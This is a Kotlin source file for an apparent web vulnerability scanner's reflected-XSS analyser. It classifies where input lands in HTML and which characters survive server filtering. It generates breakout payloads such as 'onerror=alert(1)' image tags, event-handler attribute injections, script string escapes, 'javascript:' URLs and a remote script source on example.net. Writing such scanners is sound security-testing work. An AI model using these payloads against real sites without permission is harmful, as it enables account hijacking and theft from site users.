package io.bitbytelab.raijin.injection

/**
 * Reflected-XSS analysis without a browser: where a reflected value lands in the HTML
 * ([reflections]), what the server did to each significant character ([survival]), and whether
 * that position can be escaped with the characters that came back usable ([breakout]).
 *
 * The HTML and script scanning is deliberately small (no entity handling in text, no regex
 * literals or `${}` nesting in scripts): it only has to place a marker, and an escape is always
 * confirmed by sending the breakout and finding the marker in its new position.
 */
object XssOracle {

    /** Characters whose treatment decides whether a context can be escaped. */
    const val PROBE_CHARS = "<>\"'`\\/() ="

    private const val MAX_SCAN = 300_000
    private const val MAX_REFLECTIONS = 20
    private const val MAX_SEGMENT = 400

    /** Syntactic position of a reflection. */
    enum class Kind(val id: String) {
        HTML_TEXT("html_text"),

        /** Inside a tag but outside any attribute value: a tag or attribute name. */
        TAG("tag"),
        ATTR_DOUBLE("attr_double_quoted"),
        ATTR_SINGLE("attr_single_quoted"),
        ATTR_UNQUOTED("attr_unquoted"),

        /** `<!-- -->`, and other markup that runs to the next `>` (end tag, doctype). */
        COMMENT("html_comment"),

        /** Raw-text element such as `<textarea>` or `<title>`: markup inside is not parsed. */
        RCDATA("rcdata"),
        SCRIPT_CODE("script_code"),
        SCRIPT_DOUBLE("script_string_double"),
        SCRIPT_SINGLE("script_string_single"),
        SCRIPT_TEMPLATE("script_template_literal"),
        SCRIPT_COMMENT("script_comment"),

        /** `<script>` with a non-script `type` (JSON, a template): data until `</script>`. */
        SCRIPT_DATA("script_data"),
        STYLE("style");

        val isAttributeValue: Boolean get() = this == ATTR_DOUBLE || this == ATTR_SINGLE || this == ATTR_UNQUOTED
    }

    /**
     * One occurrence of the probe value. [tag] is the element being opened (tag and attribute
     * kinds) or the raw-text element around it; [attribute] is the attribute the value belongs
     * to, empty in a tag name; [valuePrefix] is the attribute value up to the occurrence.
     */
    data class Reflection(
        val kind: Kind,
        val offset: Int,
        val tag: String = "",
        val attribute: String = "",
        val valuePrefix: String = "",
    )

    /** What the server did to one probed character. */
    enum class Fate(val id: String) {
        RAW("raw"),
        HTML_ENTITY("html_entity"),
        URL_ENCODED("url_encoded"),
        BACKSLASH_ESCAPED("backslash_escaped"),
        JS_ESCAPED("js_escaped"),
        STRIPPED("stripped"),
        OTHER("other"),
    }

    /** Fate of each probed character at the reflection starting at [offset]. */
    data class Survival(val offset: Int, val fates: Map<Char, Fate>)

    /**
     * How a reflection can be escaped. [proof] is the value to send next, null when the
     * character survival already shows the escape; [confirms] recognises the escape in the
     * response to [proof] (the token arriving as a tag name, an attribute name or script code).
     * [example] is a payload of the same shape for a browser.
     */
    class Breakout(val reason: String, val proof: String?, val example: String, val confirms: (Reflection) -> Boolean)

    private val SCRIPT_TYPES = listOf("javascript", "ecmascript", "module", "jscript")
    private val RAW_TEXT = setOf("textarea", "title", "xmp", "noembed", "noframes", "iframe", "plaintext")
    private val URL_SINKS = setOf(
        "a:href", "a:xlink:href", "area:href", "iframe:src", "frame:src", "embed:src", "object:data",
        "form:action", "button:formaction", "input:formaction", "base:href", "script:src", "link:href",
    )
    private val MARKUP = Regex("(?i)<(!doctype|html|head|body|div|span|script|p|a|form|table|svg|img|input)\\b")
    private val ENTITY = Regex("&(#[xX][0-9a-fA-F]{1,6}|#[0-9]{1,7}|[A-Za-z]{2,8});")
    private val NAMED_ENTITIES = mapOf(
        "lt" to '<', "gt" to '>', "quot" to '"', "apos" to '\'', "amp" to '&', "grave" to '`',
        "lpar" to '(', "rpar" to ')', "equals" to '=', "sol" to '/', "bsol" to '\\',
    )

    /** True when a browser renders a response of this type as a document (so markup in it runs). */
    fun rendersAsHtml(contentType: String?, body: String): Boolean {
        val type = contentType?.substringBefore(';')?.trim()?.lowercase().orEmpty()
        return when (type) {
            "" -> MARKUP.containsMatchIn(if (body.length > 4096) body.substring(0, 4096) else body)
            "text/html", "application/xhtml+xml", "image/svg+xml", "text/xml", "application/xml" -> true
            else -> false
        }
    }

    /** Every occurrence of [needle] in [html] (case-insensitive, first [limit]) with its syntactic position. */
    fun reflections(html: String, needle: String, limit: Int = MAX_REFLECTIONS): List<Reflection> {
        if (needle.isEmpty()) return emptyList()
        val text = if (html.length > MAX_SCAN) html.substring(0, MAX_SCAN) else html
        val offsets = ArrayList<Int>()
        var found = text.indexOf(needle, ignoreCase = true)
        while (found >= 0 && offsets.size < limit) {
            offsets += found
            found = text.indexOf(needle, found + needle.length, ignoreCase = true)
        }
        if (offsets.isEmpty()) return emptyList()

        val out = ArrayList<Reflection>()
        fun emit(from: Int, to: Int, make: (Int) -> Reflection) {
            for (offset in offsets) if (offset in from until to) out += make(offset)
        }

        val n = text.length
        var i = 0
        while (i < n) {
            if (text[i] != '<') {
                val next = text.indexOf('<', i).let { if (it < 0) n else it }
                emit(i, next) { Reflection(Kind.HTML_TEXT, it) }
                i = next
                continue
            }
            if (text.startsWith("<!--", i)) {
                val end = text.indexOf("-->", i + 4).let { if (it < 0) n else it + 3 }
                emit(i, end) { Reflection(Kind.COMMENT, it) }
                i = end
                continue
            }
            val opener = if (i + 1 < n) text[i + 1] else ' '
            if (opener == '/' || opener == '!' || opener == '?') {
                val end = text.indexOf('>', i).let { if (it < 0) n else it + 1 }
                emit(i, end) { Reflection(Kind.COMMENT, it) }
                i = end
                continue
            }
            if (!opener.isLetter()) {
                i++ // a bare '<' is text
                continue
            }

            var k = i + 1
            while (k < n && !text[k].isWhitespace() && text[k] != '/' && text[k] != '>') k++
            val tag = text.substring(i + 1, k).lowercase()
            emit(i + 1, k) { Reflection(Kind.TAG, it, tag) }
            var scriptType = ""
            while (k < n) {
                while (k < n && (text[k].isWhitespace() || text[k] == '/')) k++
                if (k >= n) break
                if (text[k] == '>') {
                    k++
                    break
                }
                val nameStart = k
                while (k < n && !text[k].isWhitespace() && text[k] != '=' && text[k] != '>' && text[k] != '/') k++
                if (k == nameStart) {
                    k++ // a stray '='
                    continue
                }
                val attribute = text.substring(nameStart, k).lowercase()
                emit(nameStart, k) { Reflection(Kind.TAG, it, tag, attribute) }
                while (k < n && text[k].isWhitespace()) k++
                if (k >= n || text[k] != '=') continue
                k++
                while (k < n && text[k].isWhitespace()) k++
                if (k >= n) break
                val quote = text[k]
                val valueStart: Int
                val valueEnd: Int
                val kind: Kind
                if (quote == '"' || quote == '\'') {
                    valueStart = k + 1
                    valueEnd = text.indexOf(quote, valueStart).let { if (it < 0) n else it }
                    kind = if (quote == '"') Kind.ATTR_DOUBLE else Kind.ATTR_SINGLE
                    k = minOf(valueEnd + 1, n)
                } else {
                    valueStart = k
                    while (k < n && !text[k].isWhitespace() && text[k] != '>') k++
                    valueEnd = k
                    kind = Kind.ATTR_UNQUOTED
                }
                emit(valueStart, valueEnd) { Reflection(kind, it, tag, attribute, text.substring(valueStart, it)) }
                if (attribute == "type") scriptType = text.substring(valueStart, valueEnd).trim().lowercase()
            }

            // Elements whose content is not markup run to their own end tag.
            val contentStart = k
            when (tag) {
                "script" -> {
                    val end = endTag(text, "</script", contentStart)
                    val executable = scriptType.isEmpty() || SCRIPT_TYPES.any { it in scriptType }
                    emit(contentStart, end) {
                        Reflection(if (executable) scriptKind(text, contentStart, it) else Kind.SCRIPT_DATA, it, tag)
                    }
                    i = end
                }
                "style" -> {
                    val end = endTag(text, "</style", contentStart)
                    emit(contentStart, end) { Reflection(Kind.STYLE, it, tag) }
                    i = end
                }
                in RAW_TEXT -> {
                    val end = endTag(text, "</$tag", contentStart)
                    emit(contentStart, end) { Reflection(Kind.RCDATA, it, tag) }
                    i = end
                }
                else -> i = contentStart
            }
        }
        return out.sortedBy { it.offset }
    }

    private fun endTag(text: String, marker: String, from: Int): Int =
        text.indexOf(marker, from, ignoreCase = true).let { if (it < 0) text.length else it }

    /** Script lexer state at [to], scanning from [from]: code, a string or template literal, or a comment. */
    private fun scriptKind(code: String, from: Int, to: Int): Kind {
        var state = Kind.SCRIPT_CODE
        var lineComment = false
        var i = from
        while (i < to) {
            val ch = code[i]
            val next = if (i + 1 < to) code[i + 1] else ' '
            when (state) {
                Kind.SCRIPT_CODE -> when {
                    ch == '"' -> state = Kind.SCRIPT_DOUBLE
                    ch == '\'' -> state = Kind.SCRIPT_SINGLE
                    ch == '`' -> state = Kind.SCRIPT_TEMPLATE
                    ch == '/' && (next == '/' || next == '*') -> {
                        state = Kind.SCRIPT_COMMENT
                        lineComment = next == '/'
                        i++
                    }
                }
                Kind.SCRIPT_DOUBLE, Kind.SCRIPT_SINGLE -> when (ch) {
                    '\\' -> i++
                    '\n' -> state = Kind.SCRIPT_CODE
                    (if (state == Kind.SCRIPT_DOUBLE) '"' else '\'') -> state = Kind.SCRIPT_CODE
                }
                Kind.SCRIPT_TEMPLATE -> when (ch) {
                    '\\' -> i++
                    '`' -> state = Kind.SCRIPT_CODE
                }
                Kind.SCRIPT_COMMENT -> when {
                    lineComment && ch == '\n' -> state = Kind.SCRIPT_CODE
                    !lineComment && ch == '*' && next == '/' -> {
                        state = Kind.SCRIPT_CODE
                        i++
                    }
                }
                else -> Unit
            }
            i++
        }
        return state
    }

    private fun scriptKind(code: String): Kind = scriptKind(code, 0, code.length)

    private fun entityCode(entity: String): Int? {
        if (entity.length < 4 || entity[0] != '&' || entity[entity.length - 1] != ';') return null
        val name = entity.substring(1, entity.length - 1)
        return when {
            name.startsWith("#x") || name.startsWith("#X") -> name.substring(2).toIntOrNull(16)
            name.startsWith("#") -> name.substring(1).toIntOrNull()
            else -> NAMED_ENTITIES[name.lowercase()]?.code
        }
    }

    private fun decodeEntities(text: String): String = ENTITY.replace(text) { match ->
        val code = entityCode(match.value)
        if (code != null && code in 1..0xFFFF) code.toChar().toString() else match.value
    }

    /** The value to send for [survival]: [chars] joined by [separator], between [head] and [tail]. */
    fun survivalProbe(head: String, tail: String, separator: String, chars: String = PROBE_CHARS): String =
        head + chars.toList().joinToString(separator) + tail

    /**
     * Reads back a [survivalProbe]: for each reflection that still has its [head] and [tail] and
     * all separators, what became of every character. A reflection the server cut or rewrote
     * beyond recognition is left out, so nothing is concluded from it.
     */
    fun survival(body: String, head: String, tail: String, separator: String, chars: String = PROBE_CHARS): List<Survival> {
        val text = if (body.length > MAX_SCAN) body.substring(0, MAX_SCAN) else body
        val out = ArrayList<Survival>()
        var start = text.indexOf(head, ignoreCase = true)
        while (start >= 0 && out.size < MAX_REFLECTIONS) {
            val from = start + head.length
            val end = text.indexOf(tail, from, ignoreCase = true)
            if (end >= from && end - from <= MAX_SEGMENT) {
                val pieces = text.substring(from, end).split(separator, ignoreCase = true)
                if (pieces.size == chars.length) {
                    out += Survival(start, chars.indices.associate { chars[it] to fate(chars[it], pieces[it]) })
                }
            }
            start = text.indexOf(head, from, ignoreCase = true)
        }
        return out
    }

    private fun fate(ch: Char, piece: String): Fate {
        val hex = ch.code.toString(16).padStart(2, '0')
        return when {
            piece == ch.toString() -> Fate.RAW
            piece.isEmpty() -> Fate.STRIPPED
            piece == "\\$ch" -> Fate.BACKSLASH_ESCAPED
            entityCode(piece) == ch.code -> Fate.HTML_ENTITY
            piece.equals("%$hex", ignoreCase = true) || (ch == ' ' && piece == "+") -> Fate.URL_ENCODED
            piece.equals("\\u00$hex", ignoreCase = true) || piece.equals("\\x$hex", ignoreCase = true) -> Fate.JS_ESCAPED
            else -> Fate.OTHER
        }
    }

    /**
     * The escape from [reflection] that the surviving characters ([fates]) allow, or null.
     * [token] is a fresh marker the proof carries into the position it should reach.
     */
    fun breakout(reflection: Reflection, fates: Map<Char, Fate>, token: String): Breakout? {
        fun raw(ch: Char) = fates[ch] == Fate.RAW
        val closesElement = raw('<') && raw('/') && raw('>')
        val newTag: (Reflection) -> Boolean = { it.kind == Kind.TAG && it.attribute.isEmpty() && it.tag.startsWith(token, ignoreCase = true) }
        fun leaving(element: String, why: String) =
            Breakout(why, "</$element><$token x=1>", "</$element><img src=x onerror=alert(1)>", newTag)

        return when (reflection.kind) {
            Kind.HTML_TEXT ->
                if (raw('<')) Breakout("'<' comes back unencoded in HTML text, so a tag can be opened", "<$token x=1>", "<img src=x onerror=alert(1)>", newTag)
                else null
            Kind.COMMENT ->
                if (raw('<') && raw('>')) Breakout("'>' ends the comment and '<' opens a tag", "--><$token x=1>", "--><img src=x onerror=alert(1)>", newTag)
                else null
            Kind.RCDATA ->
                if (closesElement) leaving(reflection.tag, "the <${reflection.tag}> element can be closed and a tag opened after it") else null
            Kind.STYLE ->
                if (closesElement) leaving("style", "the <style> element can be closed and a tag opened after it") else null
            Kind.SCRIPT_COMMENT, Kind.SCRIPT_DATA ->
                if (closesElement) leaving("script", "</script> ends the script block and a tag can follow") else null
            Kind.TAG ->
                if (raw('=') && raw(' ')) Breakout("the value sits inside a tag, where it can add attributes", null, "autofocus onfocus=alert(1)") { true }
                else null
            Kind.ATTR_DOUBLE -> attributeBreakout(reflection, fates, token, '"')
            Kind.ATTR_SINGLE -> attributeBreakout(reflection, fates, token, '\'')
            Kind.ATTR_UNQUOTED -> attributeBreakout(reflection, fates, token, null)
            Kind.SCRIPT_DOUBLE -> stringBreakout(fates, token, '"') ?: if (closesElement) leaving("script", "</script> ends the script block even inside a string") else null
            Kind.SCRIPT_SINGLE -> stringBreakout(fates, token, '\'') ?: if (closesElement) leaving("script", "</script> ends the script block even inside a string") else null
            Kind.SCRIPT_TEMPLATE -> stringBreakout(fates, token, '`') ?: if (closesElement) leaving("script", "</script> ends the script block even inside a template literal") else null
            Kind.SCRIPT_CODE -> when {
                raw('(') && raw(')') -> Breakout("the value is script code and parentheses come back unencoded", null, "alert(1)") { true }
                closesElement -> leaving("script", "</script> ends the script block and a tag can follow")
                else -> null
            }
        }
    }

    private fun attributeBreakout(reflection: Reflection, fates: Map<Char, Fate>, token: String, quote: Char?): Breakout? {
        val attribute = reflection.attribute
        val newAttribute: (Reflection) -> Boolean = { it.kind == Kind.TAG && it.attribute.startsWith(token, ignoreCase = true) }
        if (quote != null && fates[quote] == Fate.RAW) {
            return Breakout(
                "the $quote that closes the $attribute attribute comes back unencoded, so a new attribute can follow",
                "$quote$token=$quote", "$quote autofocus onfocus=alert(1) x=$quote", newAttribute,
            )
        }
        if (quote == null && fates[' '] == Fate.RAW) {
            return Breakout("a space ends the unquoted $attribute attribute, so a new attribute can follow", "x $token=1", "x autofocus onfocus=alert(1)", newAttribute)
        }
        if (attribute.startsWith("on")) return handlerBreakout(reflection, fates, token)
        if (reflection.valuePrefix.isBlank() && "${reflection.tag}:$attribute" in URL_SINKS) {
            val remote = reflection.tag == "script" || reflection.tag == "link" || reflection.tag == "base"
            return Breakout(
                "the value starts the $attribute URL of <${reflection.tag}>, so it chooses the scheme and host",
                "javascript:$token",
                if (remote) "//example.net/x.js" else "javascript:alert(1)",
            ) { it.kind.isAttributeValue && it.attribute == attribute && it.valuePrefix.trim().equals("javascript:", ignoreCase = true) }
        }
        return null
    }

    /** Script inside an `on*` attribute: the browser decodes HTML entities before running it, so an entity-encoded quote still ends a string. */
    private fun handlerBreakout(reflection: Reflection, fates: Map<Char, Fate>, token: String): Breakout? {
        fun usable(ch: Char) = fates[ch] == Fate.RAW || fates[ch] == Fate.HTML_ENTITY
        val attribute = reflection.attribute
        val reachesCode: (Reflection) -> Boolean = {
            it.kind.isAttributeValue && it.attribute == attribute && scriptKind(decodeEntities(it.valuePrefix)) == Kind.SCRIPT_CODE
        }
        return when (scriptKind(decodeEntities(reflection.valuePrefix))) {
            Kind.SCRIPT_CODE ->
                if (usable('(') && usable(')')) Breakout("the value is script inside the $attribute handler", null, "alert(1)") { true } else null
            Kind.SCRIPT_SINGLE ->
                if (usable('\'')) Breakout("' ends the script string inside the $attribute handler (entities are decoded before it runs)", "'-$token-'", "'-alert(1)-'", reachesCode)
                else null
            Kind.SCRIPT_DOUBLE ->
                if (usable('"')) Breakout("\" ends the script string inside the $attribute handler (entities are decoded before it runs)", "\"-$token-\"", "\"-alert(1)-\"", reachesCode)
                else null
            else -> null
        }
    }

    private fun stringBreakout(fates: Map<Char, Fate>, token: String, quote: Char): Breakout? {
        val reachesCode: (Reflection) -> Boolean = { it.kind == Kind.SCRIPT_CODE }
        return when {
            fates[quote] == Fate.RAW ->
                Breakout("the $quote that closes the script string comes back unescaped", "$quote-$token-$quote", "$quote-alert(1)-$quote", reachesCode)
            fates[quote] == Fate.BACKSLASH_ESCAPED && fates['\\'] == Fate.RAW && fates['/'] == Fate.RAW ->
                Breakout("$quote is backslash-escaped but a backslash is not, so \\$quote ends the string", "\\$quote-$token//", "\\$quote-alert(1)//", reachesCode)
            else -> null
        }
    }
}
